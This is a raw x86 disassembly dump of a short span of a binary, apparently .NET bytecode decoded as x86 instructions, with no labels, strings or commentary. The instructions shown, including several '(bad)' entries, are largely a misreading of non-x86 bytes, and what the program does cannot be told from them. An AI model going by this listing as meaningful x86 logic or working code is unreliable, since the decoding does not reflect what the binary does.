  4047c8:	1a 00                	sbb    (%eax),%al
  4047ca:	00 01                	add    %al,(%ecx)
  4047cc:	36 02 7c 36 00       	add    %ss:0x0(%esi,%esi,1),%bh
  4047d1:	00 04 03             	add    %al,(%ebx,%eax,1)
  4047d4:	28 fa                	sub    %bh,%dl
  4047d6:	00 00                	add    %al,(%eax)
  4047d8:	0a 2a                	or     (%edx),%ch
  4047da:	00 00                	add    %al,(%eax)
  4047dc:	1b 30                	sbb    (%eax),%esi
  4047de:	03 00                	add    (%eax),%eax
  4047e0:	b6 00                	mov    $0x0,%dh
  4047e2:	00 00                	add    %al,(%eax)
  4047e4:	30 00                	xor    %al,(%eax)
  4047e6:	00 11                	add    %dl,(%ecx)
  4047e8:	02 7b 3d             	add    0x3d(%ebx),%bh
  4047eb:	00 00                	add    %al,(%eax)
  4047ed:	04 0a                	add    $0xa,%al
  4047ef:	06                   	push   %es
  4047f0:	2c 5c                	sub    $0x5c,%al
  4047f2:	73 6c                	jae    0x404860
  4047f4:	00 00                	add    %al,(%eax)
  4047f6:	06                   	push   %es
  4047f7:	25 02 7b 3f 00       	and    $0x3f7b02,%eax
  4047fc:	00 04 7d 2f 00 00 04 	add    %al,0x400002f(,%edi,2)
  404803:	25 02 7b 40 00       	and    $0x407b02,%eax
  404808:	00 04 7d 30 00 00 04 	add    %al,0x4000030(,%edi,2)
  40480f:	fe 06                	incb   (%esi)
  404811:	6d                   	insl   (%dx),%es:(%edi)
  404812:	00 00                	add    %al,(%eax)
  404814:	06                   	push   %es
  404815:	73 ed                	jae    0x404804
  404817:	00 00                	add    %al,(%eax)
  404819:	0a 28                	or     (%eax),%ch
  40481b:	ee                   	out    %al,(%dx)
  40481c:	00 00                	add    %al,(%eax)
  40481e:	0a 6f ca             	or     -0x36(%edi),%ch
  404821:	00 00                	add    %al,(%eax)
  404823:	0a 0b                	or     (%ebx),%cl
  404825:	12 01                	adc    (%ecx),%al
  404827:	28 ef                	sub    %ch,%bh
  404829:	00 00                	add    %al,(%eax)
  40482b:	0a 2d 3c 02 16 25    	or     0x2516023c,%ch
  404831:	0a 7d 3d             	or     0x3d(%ebp),%bh
  404834:	00 00                	add    %al,(%eax)
  404836:	04 02                	add    $0x2,%al
  404838:	07                   	pop    %es
  404839:	7d 41                	jge    0x40487c
  40483b:	00 00                	add    %al,(%eax)
  40483d:	04 02                	add    $0x2,%al
  40483f:	7c 3e                	jl     0x40487f
  404841:	00 00                	add    %al,(%eax)
  404843:	04 12                	add    $0x12,%al
  404845:	01 02                	add    %eax,(%edx)
  404847:	28 0a                	sub    %cl,(%edx)
  404849:	00 00                	add    %al,(%eax)
  40484b:	2b de                	sub    %esi,%ebx
  40484d:	4f                   	dec    %edi
  40484e:	02 7b 41             	add    0x41(%ebx),%bh
  404851:	00 00                	add    %al,(%eax)
  404853:	04 0b                	add    $0xb,%al
  404855:	02 7c 41 00          	add    0x0(%ecx,%eax,2),%bh
  404859:	00 04 fe             	add    %al,(%esi,%edi,8)
  40485c:	15 3a 00 00 01       	adc    $0x100003a,%eax
  404861:	02 15 25 0a 7d 3d    	add    0x3d7d0a25,%dl
  404867:	00 00                	add    %al,(%eax)
  404869:	04 12                	add    $0x12,%al
  40486b:	01 28                	add    %ebp,(%eax)
  40486d:	cb                   	lret
  40486e:	00 00                	add    %al,(%eax)
  404870:	0a de                	or     %dh,%bl
  404872:	17                   	pop    %ss
  404873:	0c 02                	or     $0x2,%al
  404875:	1f                   	pop    %ds
  404876:	fe                   	(bad)
  404877:	7d 3d                	jge    0x4048b6
  404879:	00 00                	add    %al,(%eax)
  40487b:	04 02                	add    $0x2,%al
  40487d:	7c 3e                	jl     0x4048bd
  40487f:	00 00                	add    %al,(%eax)
  404881:	04 08                	add    $0x8,%al
  404883:	28 f8                	sub    %bh,%al
  404885:	00 00                	add    %al,(%eax)
  404887:	0a de                	or     %dh,%bl
  404889:	13 02                	adc    (%edx),%eax
  40488b:	1f                   	pop    %ds
  40488c:	fe                   	(bad)
  40488d:	7d 3d                	jge    0x4048cc
  40488f:	00 00                	add    %al,(%eax)
  404891:	04 02                	add    $0x2,%al
  404893:	7c 3e                	jl     0x4048d3
  404895:	00 00                	add    %al,(%eax)
  404897:	04 28                	add    $0x28,%al
  404899:	f9                   	stc
  40489a:	00 00                	add    %al,(%eax)
  40489c:	0a 2a                	or     (%edx),%ch
  40489e:	00 00                	add    %al,(%eax)
  4048a0:	01 10                	add    %edx,(%eax)
  4048a2:	00 00                	add    %al,(%eax)
  4048a4:	00 00                	add    %al,(%eax)
  4048a6:	07                   	pop    %es
  4048a7:	00 84 8b 00 17 1a 00 	add    %al,0x1a1700(%ebx,%ecx,4)
  4048ae:	00 01                	add    %al,(%ecx)
  4048b0:	36 02 7c 3e 00       	add    %ss:0x0(%esi,%edi,1),%bh
  4048b5:	00 04 03             	add    %al,(%ebx,%eax,1)
  4048b8:	28 fa                	sub    %bh,%dl
  4048ba:	00 00                	add    %al,(%eax)
  4048bc:	0a 2a                	or     (%edx),%ch
  4048be:	2e 73 76             	jae,pn 0x404937
  4048c1:	00 00                	add    %al,(%eax)
  4048c3:	06                   	push   %es
  4048c4:	80 42 00 00          	addb   $0x0,0x0(%edx)
  4048c8:	04 2a                	add    $0x2a,%al
  4048ca:	1e                   	push   %ds
  4048cb:	02 28                	add    (%eax),%ch
  4048cd:	4a                   	dec    %edx
  4048ce:	00 00                	add    %al,(%eax)
  4048d0:	0a 2a                	or     (%edx),%ch
  4048d2:	00 00                	add    %al,(%eax)
  4048d4:	1b 30                	sbb    (%eax),%esi
  4048d6:	03 00                	add    (%eax),%eax
  4048d8:	65 00 00             	add    %al,%gs:(%eax)
  4048db:	00 23                	add    %ah,(%ebx)
  4048dd:	00 00                	add    %al,(%eax)
  4048df:	11 00                	adc    %eax,(%eax)
  4048e1:	7e 17                	jle    0x4048fa
  4048e3:	00 00                	add    %al,(%eax)
  4048e5:	04 7e                	add    $0x7e,%al
  4048e7:	19 00                	sbb    %eax,(%eax)
  4048e9:	00 04 7e             	add    %al,(%esi,%edi,2)
  4048ec:	17                   	pop    %ss
  4048ed:	00 00                	add    %al,(%eax)
  4048ef:	04 8e                	add    $0x8e,%al
  4048f1:	69 6f c0 00 00 0a 9a 	imul   $0x9a0a0000,-0x40(%edi),%ebp
  4048f8:	28 43 00             	sub    %al,0x0(%ebx)
  4048fb:	00 06                	add    %al,(%esi)
  4048fd:	0a 06                	or     (%esi),%al
  4048ff:	28 2b                	sub    %ch,(%ebx)
  404901:	00 00                	add    %al,(%eax)
  404903:	0a 0b                	or     (%ebx),%cl
  404905:	07                   	pop    %es
  404906:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40490a:	06                   	push   %es
  40490b:	07                   	pop    %es
  40490c:	28 45 00             	sub    %al,0x0(%ebp)
  40490f:	00 06                	add    %al,(%esi)
  404911:	28 48 00             	sub    %cl,0x0(%eax)
  404914:	00 06                	add    %al,(%esi)
  404916:	2c 06                	sub    $0x6,%al
  404918:	07                   	pop    %es
  404919:	28 46 00             	sub    %al,0x0(%esi)
  40491c:	00 06                	add    %al,(%esi)
  40491e:	07                   	pop    %es
  40491f:	28 47 00             	sub    %al,0x0(%edi)
  404922:	00 06                	add    %al,(%esi)
  404924:	7e 19                	jle    0x40493f
  404926:	00 00                	add    %al,(%eax)
  404928:	04 1f                	add    $0x1f,%al
  40492a:	1e                   	push   %ds
  40492b:	1f                   	pop    %ds
  40492c:	5a                   	pop    %edx
  40492d:	6f                   	outsl  %ds:(%esi),(%dx)
  40492e:	39 00                	cmp    %eax,(%eax)
  404930:	00 0a                	add    %cl,(%edx)
  404932:	1f                   	pop    %ds
  404933:	3c 5a                	cmp    $0x5a,%al
  404935:	20 e8                	and    %ch,%al
  404937:	03 00                	add    (%eax),%eax
  404939:	00 5a 28             	add    %bl,0x28(%edx)
  40493c:	3a 00                	cmp    (%eax),%al
  40493e:	00 0a                	add    %cl,(%edx)
  404940:	de 9e 26 de 9b 00    	ficomps 0x9bde26(%esi)
  404946:	00 00                	add    %al,(%eax)
  404948:	01 10                	add    %edx,(%eax)
  40494a:	00 00                	add    %al,(%eax)
  40494c:	00 00                	add    %al,(%eax)
  40494e:	01 00                	add    %eax,(%eax)
  404950:	61                   	popa
  404951:	62 00                	bound  %eax,(%eax)
  404953:	03 13                	add    (%ebx),%edx
  404955:	00 00                	add    %al,(%eax)
  404957:	01 1b                	add    %ebx,(%ebx)
  404959:	30 03                	xor    %al,(%ebx)
  40495b:	00 8a 01 00 00 30    	add    %cl,0x30000001(%edx)
  404961:	00 00                	add    %al,(%eax)
  404963:	11 02                	adc    %eax,(%edx)
  404965:	7b 44                	jnp    0x4049ab
  404967:	00 00                	add    %al,(%eax)
  404969:	04 0a                	add    $0xa,%al
  40496b:	06                   	push   %es
  40496c:	17                   	pop    %ss
  40496d:	26 26 00 06          	es add %al,%es:(%esi)
  404971:	39 b4 00 00 00 06 17 	cmp    %esi,0x17060000(%eax,%eax,1)
  404978:	3b 19                	cmp    (%ecx),%ebx
  40497a:	01 00                	add    %eax,(%eax)
  40497c:	00 28                	add    %ch,(%eax)
  40497e:	28 00                	sub    %al,(%eax)
  404980:	00 06                	add    %al,(%esi)
  404982:	2c 05                	sub    $0x5,%al
  404984:	dd 51 01             	fstl   0x1(%ecx)
  404987:	00 00                	add    %al,(%eax)
  404989:	28 31                	sub    %dh,(%ecx)
  40498b:	00 00                	add    %al,(%eax)
  40498d:	0a 6f 32             	or     0x32(%edi),%ch
  404990:	00 00                	add    %al,(%eax)
  404992:	0a 6f 33             	or     0x33(%edi),%ch
  404995:	00 00                	add    %al,(%eax)
  404997:	0a 28                	or     (%eax),%ch
  404999:	20 00                	and    %al,(%eax)
  40499b:	00 06                	add    %al,(%esi)
  40499d:	28 4d 00             	sub    %cl,0x0(%ebp)
  4049a0:	00 06                	add    %al,(%esi)
  4049a2:	28 42 00             	sub    %al,0x0(%edx)
  4049a5:	00 06                	add    %al,(%esi)
  4049a7:	28 05 00 00 06 28    	sub    %al,0x28060000
  4049ad:	09 00                	or     %eax,(%eax)
  4049af:	00 06                	add    %al,(%esi)
  4049b1:	28 0b                	sub    %cl,(%ebx)
  4049b3:	00 00                	add    %al,(%eax)
  4049b5:	06                   	push   %es
  4049b6:	28 50 00             	sub    %dl,0x0(%eax)
  4049b9:	00 06                	add    %al,(%esi)
  4049bb:	28 1f                	sub    %bl,(%edi)
  4049bd:	00 00                	add    %al,(%eax)
  4049bf:	06                   	push   %es
  4049c0:	28 1b                	sub    %bl,(%ebx)
  4049c2:	00 00                	add    %al,(%eax)
  4049c4:	06                   	push   %es
  4049c5:	28 33                	sub    %dh,(%ebx)
  4049c7:	00 00                	add    %al,(%eax)
  4049c9:	06                   	push   %es
  4049ca:	28 5b 00             	sub    %bl,0x0(%ebx)
  4049cd:	00 06                	add    %al,(%esi)
  4049cf:	28 27                	sub    %ah,(%edi)
  4049d1:	00 00                	add    %al,(%eax)
  4049d3:	06                   	push   %es
  4049d4:	28 22                	sub    %ah,(%edx)
  4049d6:	00 00                	add    %al,(%eax)
  4049d8:	06                   	push   %es
  4049d9:	26 28 08             	sub    %cl,%es:(%eax)
  4049dc:	00 00                	add    %al,(%eax)
  4049de:	06                   	push   %es
  4049df:	28 06                	sub    %al,(%esi)
  4049e1:	00 00                	add    %al,(%eax)
  4049e3:	06                   	push   %es
  4049e4:	28 24 00             	sub    %ah,(%eax,%eax,1)
  4049e7:	00 06                	add    %al,(%esi)
  4049e9:	28 01                	sub    %al,(%ecx)
  4049eb:	00 00                	add    %al,(%eax)
  4049ed:	06                   	push   %es
  4049ee:	28 5b 00             	sub    %bl,0x0(%ebx)
  4049f1:	00 06                	add    %al,(%esi)
  4049f3:	28 37                	sub    %dh,(%edi)
  4049f5:	00 00                	add    %al,(%eax)
  4049f7:	06                   	push   %es
  4049f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4049f9:	ca 00 00             	lret   $0x0
  4049fc:	0a 0b                	or     (%ebx),%cl
  4049fe:	12 01                	adc    (%ecx),%al
  404a00:	28 ef                	sub    %ch,%bh
  404a02:	00 00                	add    %al,(%eax)
  404a04:	0a 2d 3f 02 16 25    	or     0x2516023f,%ch
  404a0a:	0a 7d 44             	or     0x44(%ebp),%bh
  404a0d:	00 00                	add    %al,(%eax)
  404a0f:	04 02                	add    $0x2,%al
  404a11:	07                   	pop    %es
  404a12:	7d 46                	jge    0x404a5a
  404a14:	00 00                	add    %al,(%eax)
  404a16:	04 02                	add    $0x2,%al
  404a18:	7c 45                	jl     0x404a5f
  404a1a:	00 00                	add    %al,(%eax)
  404a1c:	04 12                	add    $0x12,%al
  404a1e:	01 02                	add    %eax,(%edx)
  404a20:	28 0b                	sub    %cl,(%ebx)
  404a22:	00 00                	add    %al,(%eax)
  404a24:	2b dd                	sub    %ebp,%ebx
  404a26:	c3                   	ret
  404a27:	00 00                	add    %al,(%eax)
  404a29:	00 02                	add    %al,(%edx)
  404a2b:	7b 46                	jnp    0x404a73
  404a2d:	00 00                	add    %al,(%eax)
  404a2f:	04 0b                	add    $0xb,%al
  404a31:	02 7c 46 00          	add    0x0(%esi,%eax,2),%bh
  404a35:	00 04 fe             	add    %al,(%esi,%edi,8)
  404a38:	15 3a 00 00 01       	adc    $0x100003a,%eax
  404a3d:	02 15 25 0a 7d 44    	add    0x447d0a25,%dl
  404a43:	00 00                	add    %al,(%eax)
  404a45:	04 12                	add    $0x12,%al
  404a47:	01 28                	add    %ebp,(%eax)
  404a49:	cb                   	lret
  404a4a:	00 00                	add    %al,(%eax)
  404a4c:	0a 7e 1a             	or     0x1a(%esi),%bh
  404a4f:	00 00                	add    %al,(%eax)
  404a51:	04 17                	add    $0x17,%al
  404a53:	1c 6f                	sbb    $0x6f,%al
  404a55:	39 00                	cmp    %eax,(%eax)
  404a57:	00 0a                	add    %cl,(%edx)
  404a59:	1f                   	pop    %ds
  404a5a:	3c 5a                	cmp    $0x5a,%al
  404a5c:	20 e8                	and    %ch,%al
  404a5e:	03 00                	add    (%eax),%eax
  404a60:	00 5a 28             	add    %bl,0x28(%edx)
  404a63:	fb                   	sti
  404a64:	00 00                	add    %al,(%eax)
  404a66:	0a 6f ca             	or     -0x36(%edi),%ch
  404a69:	00 00                	add    %al,(%eax)
  404a6b:	0a 0b                	or     (%ebx),%cl
  404a6d:	12 01                	adc    (%ecx),%al
  404a6f:	28 ef                	sub    %ch,%bh
  404a71:	00 00                	add    %al,(%eax)
  404a73:	0a 2d 3c 02 17 25    	or     0x2517023c,%ch
  404a79:	0a 7d 44             	or     0x44(%ebp),%bh
  404a7c:	00 00                	add    %al,(%eax)
  404a7e:	04 02                	add    $0x2,%al
  404a80:	07                   	pop    %es
  404a81:	7d 46                	jge    0x404ac9
  404a83:	00 00                	add    %al,(%eax)
  404a85:	04 02                	add    $0x2,%al
  404a87:	7c 45                	jl     0x404ace
  404a89:	00 00                	add    %al,(%eax)
  404a8b:	04 12                	add    $0x12,%al
  404a8d:	01 02                	add    %eax,(%edx)
  404a8f:	28 0b                	sub    %cl,(%ebx)
  404a91:	00 00                	add    %al,(%eax)
  404a93:	2b de                	sub    %esi,%ebx
  404a95:	57                   	push   %edi
  404a96:	02 7b 46             	add    0x46(%ebx),%bh
  404a99:	00 00                	add    %al,(%eax)
  404a9b:	04 0b                	add    $0xb,%al
  404a9d:	02 7c 46 00          	add    0x0(%esi,%eax,2),%bh
  404aa1:	00 04 fe             	add    %al,(%esi,%edi,8)
  404aa4:	15 3a 00 00 01       	adc    $0x100003a,%eax
  404aa9:	02 15 25 0a 7d 44    	add    0x447d0a25,%dl
  404aaf:	00 00                	add    %al,(%eax)
  404ab1:	04 12                	add    $0x12,%al
  404ab3:	01 28                	add    %ebp,(%eax)
  404ab5:	cb                   	lret
  404ab6:	00 00                	add    %al,(%eax)
  404ab8:	0a 38                	or     (%eax),%bh
  404aba:	30 ff                	xor    %bh,%bh
  404abc:	ff                   	(bad)
  404abd:	ff 26                	jmp    *(%esi)
  404abf:	de 00                	fiadds (%eax)
  404ac1:	de 17                	ficoms (%edi)
  404ac3:	0c 02                	or     $0x2,%al
  404ac5:	1f                   	pop    %ds
  404ac6:	fe                   	(bad)
  404ac7:	7d 44                	jge    0x404b0d
  404ac9:	00 00                	add    %al,(%eax)
  404acb:	04 02                	add    $0x2,%al
  404acd:	7c 45                	jl     0x404b14
  404acf:	00 00                	add    %al,(%eax)
  404ad1:	04 08                	add    $0x8,%al
  404ad3:	28 f8                	sub    %bh,%al
  404ad5:	00 00                	add    %al,(%eax)
  404ad7:	0a de                	or     %dh,%bl
  404ad9:	13 02                	adc    (%edx),%eax
  404adb:	1f                   	pop    %ds
  404adc:	fe                   	(bad)
  404add:	7d 44                	jge    0x404b23
  404adf:	00 00                	add    %al,(%eax)
  404ae1:	04 02                	add    $0x2,%al
  404ae3:	7c 45                	jl     0x404b2a
  404ae5:	00 00                	add    %al,(%eax)
  404ae7:	04 28                	add    $0x28,%al
  404ae9:	f9                   	stc
  404aea:	00 00                	add    %al,(%eax)
  404aec:	0a 2a                	or     (%edx),%ch
  404aee:	00 00                	add    %al,(%eax)
  404af0:	41                   	inc    %ecx
  404af1:	34 00                	xor    $0x0,%al
  404af3:	00 00                	add    %al,(%eax)
  404af5:	00 00                	add    %al,(%eax)
  404af7:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404afa:	00 00                	add    %al,(%eax)
  404afc:	4e                   	dec    %esi
  404afd:	01 00                	add    %eax,(%eax)
  404aff:	00 5a 01             	add    %bl,0x1(%edx)
  404b02:	00 00                	add    %al,(%eax)
  404b04:	03 00                	add    (%eax),%eax
  404b06:	00 00                	add    %al,(%eax)
  404b08:	13 00                	adc    (%eax),%eax
  404b0a:	00 01                	add    %al,(%ecx)
  404b0c:	00 00                	add    %al,(%eax)
  404b0e:	00 00                	add    %al,(%eax)
  404b10:	07                   	pop    %es
  404b11:	00 00                	add    %al,(%eax)
  404b13:	00 58 01             	add    %bl,0x1(%eax)
  404b16:	00 00                	add    %al,(%eax)
  404b18:	5f                   	pop    %edi
  404b19:	01 00                	add    %eax,(%eax)
  404b1b:	00 17                	add    %dl,(%edi)
  404b1d:	00 00                	add    %al,(%eax)
  404b1f:	00 1a                	add    %bl,(%edx)
  404b21:	00 00                	add    %al,(%eax)
  404b23:	01 36                	add    %esi,(%esi)
  404b25:	02 7c 45 00          	add    0x0(%ebp,%eax,2),%bh
  404b29:	00 04 03             	add    %al,(%ebx,%eax,1)
  404b2c:	28 fa                	sub    %bh,%dl
  404b2e:	00 00                	add    %al,(%eax)
  404b30:	0a 2a                	or     (%edx),%ch
  404b32:	2e 73 7b             	jae,pn 0x404bb0
  404b35:	00 00                	add    %al,(%eax)
  404b37:	06                   	push   %es
  404b38:	80 47 00 00          	addb   $0x0,0x0(%edi)
  404b3c:	04 2a                	add    $0x2a,%al
  404b3e:	1e                   	push   %ds
  404b3f:	02 28                	add    (%eax),%ch
  404b41:	4a                   	dec    %edx
  404b42:	00 00                	add    %al,(%eax)
  404b44:	0a 2a                	or     (%edx),%ch
  404b46:	00 00                	add    %al,(%eax)
  404b48:	13 30                	adc    (%eax),%esi
  404b4a:	02 00                	add    (%eax),%al
  404b4c:	2f                   	das
  404b4d:	00 00                	add    %al,(%eax)
  404b4f:	00 31                	add    %dh,(%ecx)
  404b51:	00 00                	add    %al,(%eax)
  404b53:	11 12                	adc    %edx,(%edx)
  404b55:	00 28                	add    %ch,(%eax)
  404b57:	94                   	xchg   %eax,%esp
  404b58:	00 00                	add    %al,(%eax)
  404b5a:	0a 7d 5f             	or     0x5f(%ebp),%bh
  404b5d:	00 00                	add    %al,(%eax)
  404b5f:	04 12                	add    $0x12,%al
  404b61:	00 15 7d 5e 00 00    	add    %dl,0x5e7d
  404b67:	04 12                	add    $0x12,%al
  404b69:	00 7c 5f 00          	add    %bh,0x0(%edi,%ebx,2)
  404b6d:	00 04 12             	add    %al,(%edx,%edx,1)
  404b70:	00 28                	add    %ch,(%eax)
  404b72:	0c 00                	or     $0x0,%al
  404b74:	00 2b                	add    %ch,(%ebx)
  404b76:	12 00                	adc    (%eax),%al
  404b78:	7c 5f                	jl     0x404bd9
  404b7a:	00 00                	add    %al,(%eax)
  404b7c:	04 28                	add    $0x28,%al
  404b7e:	96                   	xchg   %eax,%esi
  404b7f:	00 00                	add    %al,(%eax)
  404b81:	0a 2a                	or     (%edx),%ch
  404b83:	00 1b                	add    %bl,(%ebx)
  404b85:	30 04 00             	xor    %al,(%eax,%eax,1)
  404b88:	33 01                	xor    (%ecx),%eax
  404b8a:	00 00                	add    %al,(%eax)
  404b8c:	32 00                	xor    (%eax),%al
  404b8e:	00 11                	add    %dl,(%ecx)
  404b90:	02 7b 49             	add    0x49(%ebx),%bh
  404b93:	00 00                	add    %al,(%eax)
  404b95:	04 0a                	add    $0xa,%al
  404b97:	06                   	push   %es
  404b98:	26 00 06             	add    %al,%es:(%esi)
  404b9b:	2c 0b                	sub    $0xb,%al
  404b9d:	02 73 b7             	add    -0x49(%ebx),%dh
  404ba0:	00 00                	add    %al,(%eax)
  404ba2:	0a 7d 4b             	or     0x4b(%ebp),%bh
  404ba5:	00 00                	add    %al,(%eax)
  404ba7:	04 00                	add    $0x0,%al
  404ba9:	06                   	push   %es
  404baa:	2c 6d                	sub    $0x6d,%al
  404bac:	02 02                	add    (%edx),%al
  404bae:	7b 4b                	jnp    0x404bfb
  404bb0:	00 00                	add    %al,(%eax)
  404bb2:	04 72                	add    $0x72,%al
  404bb4:	0b 17                	or     (%edi),%edx
  404bb6:	00 70 1f             	add    %dh,0x1f(%eax)
  404bb9:	35 6f b8 00 00       	xor    $0xb86f,%eax
  404bbe:	0a 7d 4c             	or     0x4c(%ebp),%bh
  404bc1:	00 00                	add    %al,(%eax)
  404bc3:	04 20                	add    $0x20,%al
  404bc5:	e8 03 00 00 28       	call   0x28404bcd
  404bca:	fb                   	sti
  404bcb:	00 00                	add    %al,(%eax)
  404bcd:	0a 0b                	or     (%ebx),%cl
  404bcf:	18 8d 27 00 00 01    	sbb    %cl,0x1000027(%ebp)
  404bd5:	25 16 02 7b 4c       	and    $0x4c7b0216,%eax
  404bda:	00 00                	add    %al,(%eax)
  404bdc:	04 a2                	add    $0xa2,%al
  404bde:	25 17 07 a2 28       	and    $0x28a20717,%eax
  404be3:	fc                   	cld
  404be4:	00 00                	add    %al,(%eax)
  404be6:	0a 6f fd             	or     -0x3(%edi),%ch
  404be9:	00 00                	add    %al,(%eax)
  404beb:	0a 0c 12             	or     (%edx,%edx,1),%cl
  404bee:	02 28                	add    (%eax),%ch
  404bf0:	fe 00                	incb   (%eax)
  404bf2:	00 0a                	add    %cl,(%edx)
  404bf4:	2d 3f 02 16 25       	sub    $0x2516023f,%eax
  404bf9:	0a 7d 49             	or     0x49(%ebp),%bh
  404bfc:	00 00                	add    %al,(%eax)
  404bfe:	04 02                	add    $0x2,%al
  404c00:	08 7d 4d             	or     %bh,0x4d(%ebp)
  404c03:	00 00                	add    %al,(%eax)
  404c05:	04 02                	add    $0x2,%al
  404c07:	7c 4a                	jl     0x404c53
  404c09:	00 00                	add    %al,(%eax)
  404c0b:	04 12                	add    $0x12,%al
  404c0d:	02 02                	add    (%edx),%al
  404c0f:	28 0d 00 00 2b dd    	sub    %cl,0xdd2b0000
  404c15:	a9 00 00 00 02       	test   $0x2000000,%eax
  404c1a:	7b 4d                	jnp    0x404c69
  404c1c:	00 00                	add    %al,(%eax)
  404c1e:	04 0c                	add    $0xc,%al
  404c20:	02 7c 4d 00          	add    0x0(%ebp,%ecx,2),%bh
  404c24:	00 04 fe             	add    %al,(%esi,%edi,8)
  404c27:	15 06 00 00 1b       	adc    $0x1b000006,%eax
  404c2c:	02 15 25 0a 7d 49    	add    0x497d0a25,%dl
  404c32:	00 00                	add    %al,(%eax)
  404c34:	04 12                	add    $0x12,%al
  404c36:	02 28                	add    (%eax),%ch
  404c38:	ff 00                	incl   (%eax)
  404c3a:	00 0a                	add    %cl,(%edx)
  404c3c:	02 7b 4c             	add    0x4c(%ebx),%bh
  404c3f:	00 00                	add    %al,(%eax)
  404c41:	04 33                	add    $0x33,%al
  404c43:	1a 02                	sbb    (%edx),%al
  404c45:	7b 4b                	jnp    0x404c92
  404c47:	00 00                	add    %al,(%eax)
  404c49:	04 6f                	add    $0x6f,%al
  404c4b:	ba 00 00 0a 2c       	mov    $0x2c0a0000,%edx
  404c50:	0d 02 7b 4b 00       	or     $0x4b7b02,%eax
  404c55:	00 04 6f             	add    %al,(%edi,%ebp,2)
  404c58:	00 01                	add    %al,(%ecx)
  404c5a:	00 0a                	add    %cl,(%edx)
  404c5c:	2b 0b                	sub    (%ebx),%ecx
  404c5e:	02 7b 4b             	add    0x4b(%ebx),%bh
  404c61:	00 00                	add    %al,(%eax)
  404c63:	04 6f                	add    $0x6f,%al
  404c65:	01 01                	add    %eax,(%ecx)
  404c67:	00 0a                	add    %cl,(%edx)
  404c69:	02 14 7d 4c 00 00 04 	add    0x400004c(,%edi,2),%dl
  404c70:	de 18                	ficomps (%eax)
  404c72:	06                   	push   %es
  404c73:	16                   	push   %ss
  404c74:	2f                   	das
  404c75:	13 02                	adc    (%edx),%eax
  404c77:	7b 4b                	jnp    0x404cc4
  404c79:	00 00                	add    %al,(%eax)
  404c7b:	04 2c                	add    $0x2c,%al
  404c7d:	0b 02                	or     (%edx),%eax
  404c7f:	7b 4b                	jnp    0x404ccc
  404c81:	00 00                	add    %al,(%eax)
  404c83:	04 6f                	add    $0x6f,%al
  404c85:	70 00                	jo     0x404c87
  404c87:	00 0a                	add    %cl,(%edx)
  404c89:	dc 02                	faddl  (%edx)
  404c8b:	14 7d                	adc    $0x7d,%al
  404c8d:	4b                   	dec    %ebx
  404c8e:	00 00                	add    %al,(%eax)
  404c90:	04 de                	add    $0xde,%al
  404c92:	03 26                	add    (%esi),%esp
  404c94:	de 00                	fiadds (%eax)
  404c96:	de 17                	ficoms (%edi)
  404c98:	0d 02 1f fe 7d       	or     $0x7dfe1f02,%eax
  404c9d:	49                   	dec    %ecx
  404c9e:	00 00                	add    %al,(%eax)
  404ca0:	04 02                	add    $0x2,%al
  404ca2:	7c 4a                	jl     0x404cee
  404ca4:	00 00                	add    %al,(%eax)
  404ca6:	04 09                	add    $0x9,%al
  404ca8:	28 f8                	sub    %bh,%al
  404caa:	00 00                	add    %al,(%eax)
  404cac:	0a de                	or     %dh,%bl
  404cae:	13 02                	adc    (%edx),%eax
  404cb0:	1f                   	pop    %ds
  404cb1:	fe                   	(bad)
  404cb2:	7d 49                	jge    0x404cfd
  404cb4:	00 00                	add    %al,(%eax)
  404cb6:	04 02                	add    $0x2,%al
  404cb8:	7c 4a                	jl     0x404d04
  404cba:	00 00                	add    %al,(%eax)
  404cbc:	04 28                	add    $0x28,%al
  404cbe:	f9                   	stc
  404cbf:	00 00                	add    %al,(%eax)
  404cc1:	0a 2a                	or     (%edx),%ch
  404cc3:	00 41 4c             	add    %al,0x4c(%ecx)
  404cc6:	00 00                	add    %al,(%eax)
  404cc8:	02 00                	add    (%eax),%al
  404cca:	00 00                	add    %al,(%eax)
  404ccc:	19 00                	sbb    %eax,(%eax)
  404cce:	00 00                	add    %al,(%eax)
  404cd0:	c9                   	leave
  404cd1:	00 00                	add    %al,(%eax)
  404cd3:	00 e2                	add    %ah,%dl
  404cd5:	00 00                	add    %al,(%eax)
  404cd7:	00 18                	add    %bl,(%eax)
	...
  404ce1:	00 00                	add    %al,(%eax)
  404ce3:	00 0a                	add    %cl,(%edx)
  404ce5:	00 00                	add    %al,(%eax)
  404ce7:	00 f9                	add    %bh,%cl
  404ce9:	00 00                	add    %al,(%eax)
  404ceb:	00 03                	add    %al,(%ebx)
  404ced:	01 00                	add    %eax,(%eax)
  404cef:	00 03                	add    %al,(%ebx)
  404cf1:	00 00                	add    %al,(%eax)
  404cf3:	00 13                	add    %dl,(%ebx)
  404cf5:	00 00                	add    %al,(%eax)
  404cf7:	01 00                	add    %eax,(%eax)
  404cf9:	00 00                	add    %al,(%eax)
  404cfb:	00 07                	add    %al,(%edi)
  404cfd:	00 00                	add    %al,(%eax)
  404cff:	00 01                	add    %al,(%ecx)
  404d01:	01 00                	add    %eax,(%eax)
  404d03:	00 08                	add    %cl,(%eax)
  404d05:	01 00                	add    %eax,(%eax)
  404d07:	00 17                	add    %dl,(%edi)
  404d09:	00 00                	add    %al,(%eax)
  404d0b:	00 1a                	add    %bl,(%edx)
  404d0d:	00 00                	add    %al,(%eax)
  404d0f:	01 36                	add    %esi,(%esi)
  404d11:	02 7c 4a 00          	add    0x0(%edx,%ecx,2),%bh
  404d15:	00 04 03             	add    %al,(%ebx,%eax,1)
  404d18:	28 fa                	sub    %bh,%dl
  404d1a:	00 00                	add    %al,(%eax)
  404d1c:	0a 2a                	or     (%edx),%ch
  404d1e:	2e 73 80             	jae,pn 0x404ca1
  404d21:	00 00                	add    %al,(%eax)
  404d23:	06                   	push   %es
  404d24:	80 4e 00 00          	orb    $0x0,0x0(%esi)
  404d28:	04 2a                	add    $0x2a,%al
  404d2a:	1e                   	push   %ds
  404d2b:	02 28                	add    (%eax),%ch
  404d2d:	4a                   	dec    %edx
  404d2e:	00 00                	add    %al,(%eax)
  404d30:	0a 2a                	or     (%edx),%ch
  404d32:	00 00                	add    %al,(%eax)
  404d34:	13 30                	adc    (%eax),%esi
  404d36:	02 00                	add    (%eax),%al
  404d38:	2f                   	das
  404d39:	00 00                	add    %al,(%eax)
  404d3b:	00 33                	add    %dh,(%ebx)
  404d3d:	00 00                	add    %al,(%eax)
  404d3f:	11 12                	adc    %edx,(%edx)
  404d41:	00 28                	add    %ch,(%eax)
